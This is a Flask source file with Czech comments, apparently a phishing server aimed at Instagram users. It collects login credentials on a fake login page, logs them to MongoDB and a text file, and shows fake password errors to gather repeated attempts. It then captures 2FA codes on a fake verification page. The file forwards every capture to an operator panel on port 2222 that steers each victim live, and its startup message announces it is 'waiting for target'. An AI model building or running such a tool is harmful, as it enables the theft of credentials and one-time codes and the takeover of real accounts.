# Windows ONLY!! changes needed
from flask import Flask, request, redirect, render_template, session, send_file, jsonify
import time
import os
from pymongo import MongoClient
import requests

app = Flask(__name__)
app.secret_key = 'test'  # Klíč pro podepisování session

# Připojení k MongoDB
client = MongoClient('mongodb://localhost:27017/')
db = client['zptest']  # Nahraďte 'your_database' názvem vaší MongoDB databáze
collection = db['users']

try_remove = False

print("Starting server")

num = 0

def file_sefe(username, password):
    try:
        with open('static/usernames.txt', 'a') as f:
            f.write(f"Instagram Username: {username} Pass: {password}\n")
    except FileNotFoundError: # Not working
        pass

@app.route('/image', methods=['POST', 'GET'])
def image():
    url = "http://127.0.0.1:2222/data_reciever_sse"

    data = {"2fa": "hereishere"}  # Změňte hodnotu dle potřeby

    response = requests.post(url, data=data)
    os.system("clear")
    print("Someone connected, redirecting")
    try_remove = False
    return redirect('/')

print("Image started")

@app.route('/', methods=['POST', 'GET'])
def index():
    global num
    # Získání aktuální hodnoty 'num' ze session
    print(num)

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # here
        url = "http://127.0.0.1:2222/data_reciever_sse"

        data = {"username": username, "password": password}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        time.sleep(1)
        # here
        num += 1
        session['num'] = num
        print(f"Username: {username} Password: {password}")
        print(f"Number of connection: {num}")
        # Vložení dat do MongoDB
        user_data = {'name' : "None", 'username': username, 'password': password}
        collection.insert_one(user_data)
        
        if not username or not password:
            return render_template('login.html', error="error")
        file_sefe(username, password)
        if num < 3:
            os.system("clear")
            # Vytvoření podmínky pro vyhledání záznamů
            query = {'username': username}

            # Získání záznamů z kolekce na základě podmínky
            data_list = list(collection.find(query))
            for i in data_list:
                print(i)
            return render_template('login.html', error="password")
        elif num == 3:
            print("Three connections, redirecting to error (now 2fa)")
            # Vytvoření podmínky pro vyhledání záznamů
            query = {'username': username}

            # Získání záznamů z kolekce na základě podmínky
            data_list = list(collection.find(query))
            for i in data_list:
                print(i)
            return redirect('/2fa')
        elif num > 3:
            os.system("clear")
            print("error, wrong number, restarting to value 1")
            num = 1
            session['num'] = num
            # Vytvoření podmínky pro vyhledání záznamů
            query = {'username': username}

            # Získání záznamů z kolekce na základě podmínky
            data_list = list(collection.find(query))
            for i in data_list:
                print(i)
            return render_template('login.html', error="password")
        else:
            print("Three connections, redirecting to loading")
            return redirect('/2fa')
    if num == 0:
        return render_template('login.html')
    else:
        return render_template('login.html', error="password")

print("Login started")

@app.route('/chyba')
def error():
    return render_template('chyba.html')

@app.route('/2fa')
def fake_2fa():
    return render_template('loading.html')

@app.route('/send_message', methods=['POST'])
def send_message():
    message = request.form.get('message')
    # Zpracujte zprávu dle potřeby
    print(f"Zpráva z konzole: {message}")
    url = "http://127.0.0.1:2222/data_reciever_sse"

    data = {"2fa": "again"}  # Změňte hodnotu dle potřeby

    response = requests.post(url, data=data)
    return '', 204  # 204 No Content

@app.route('/secured_2fa2', methods=['POST', 'GET'])
def real_2fa2():
    if request.method == 'POST':
        web_input_1 = request.form.get('verify1')
        web_input_2 = request.form.get('verify2')
        web_input_3 = request.form.get('verify3')
        web_input_4 = request.form.get('verify4')
        web_input_5 = request.form.get('verify5')
        web_input_6 = request.form.get('verify6')
        print(web_input_1, web_input_2, web_input_3, web_input_4, web_input_5, web_input_6)
        twofa = str(web_input_1) + str(web_input_2) + str(web_input_3) + str(web_input_4) + str(web_input_5) + str(web_input_6)
        print(twofa)
        url = "http://127.0.0.1:2222/data_reciever_sse"

        data = {"2fa": twofa}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return redirect('/2fa')
    return render_template('2fa.html')

def handle_request(what_now):
    #what_now = request.args.get('what_now', default='', type=str)

    if what_now == "b":
        return jsonify(result="b")
    elif what_now == "r":
        try_remove = True
        return redirect('/chyba')
    elif what_now == "y":
        return jsonify(result="y")
    elif what_now == "g":
        return jsonify(result="g")
    else:
        return jsonify(result="y")

@app.route('/run_python_code', methods=['GET', 'POST'])
def run_python_code():
    if request.method == 'POST':
        global what_now
        what_now = request.args.get('what_now', default='', type=str)
        print(what_now)
        # return handle_request(what_now)
        return what_now
    else:
        return what_now

@app.route('/command_result', methods=['POST'])
def command_result():
    # Zde můžete implementovat získání odpovědi z run_python_code nebo jiné akce
    #result = run_python_code()
    #print("this", result)

    global what_now
    try:
        return jsonify(what_now)
    except:
        return jsonify(run_python_code())
    
@app.route('/reset_value', methods=['POST'])
def reset_value():
    global what_now
    what_now = ""
    return jsonify(result="Value reset successfully")

@app.route('/on_login', methods=['POST'])
def on_login():
    try:
        url = "http://127.0.0.1:2222/status_recieve"

        data = {"status": "login"}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return jsonify("")
    except:
        return jsonify("")

@app.route('/on_loader', methods=['POST'])
def on_loader():
    try:
        url = "http://127.0.0.1:2222/status_recieve"

        data = {"status": "loader"}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return jsonify("")
    except:
        return jsonify("")

@app.route('/on_2fa', methods=['POST'])
def on_2fa():
    try:
        url = "http://127.0.0.1:2222/status_recieve"

        data = {"status": "2fa"}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return jsonify("")
    except:
        return jsonify("")

@app.route('/on_error', methods=['POST'])
def on_error():
    try:
        url = "http://127.0.0.1:2222/status_recieve"

        data = {"status": "error"}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return jsonify("")
    except:
        return jsonify("")

@app.route('/secured_2fa', methods=['POST', 'GET'])
def real_2fa():
    if request.method == 'POST':
        web_input_1 = request.form.get('verificationCode')
        print(web_input_1)
        url = "http://127.0.0.1:2222/data_reciever_sse"

        data = {"2fa": web_input_1}  # Změňte hodnotu dle potřeby

        response = requests.post(url, data=data)
        return redirect('/2fa')
    return render_template('2fa2.html')

print("Error (chyba) web started")
print("Everything ready to use")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
os.system("clear")
print("Waiting for target... use http://.../image !!")

if __name__ == '__main__':
    os.system("clear")
    os.system("cls")
    num = 0
    app.run(host='0.0.0.0', port=8000)
